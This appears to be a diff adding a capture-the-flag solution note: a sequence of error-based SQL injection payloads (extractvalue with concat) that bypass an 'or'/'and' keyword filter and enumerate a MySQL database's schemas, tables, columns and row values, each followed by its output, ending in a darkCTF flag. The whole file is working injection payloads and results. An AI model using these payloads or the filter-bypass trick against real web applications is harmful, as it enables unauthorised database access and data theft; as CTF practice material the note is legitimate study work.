@@ -1,0 +1,21 @@
+Blind SQLi, filter 'or', 'and'
+
+# Get database name
+?xer=1'+||+extractvalue(1,concat(0x7e,database()))--+-
+	agentxer
+
+# Get databases
+?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e))--+-
+	information_schema,agentxer,mys
+
+# Get tables
+?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables WHERE table_schema='agentxer'),0x7e))--+-
+	emails,referers,uagents,users
+
+# Get columns
+?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns WHERE table_schema='agentxer' && table_name='referers'),0x7e))--+-
+	id,referer,ip_address
+
+# Get values
+?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(id,':',referer,':',ip_address) from agentxer.referers),0x7e))--+-
+	1:darkCTF{S3cur3_s4f3_h0us3}:12
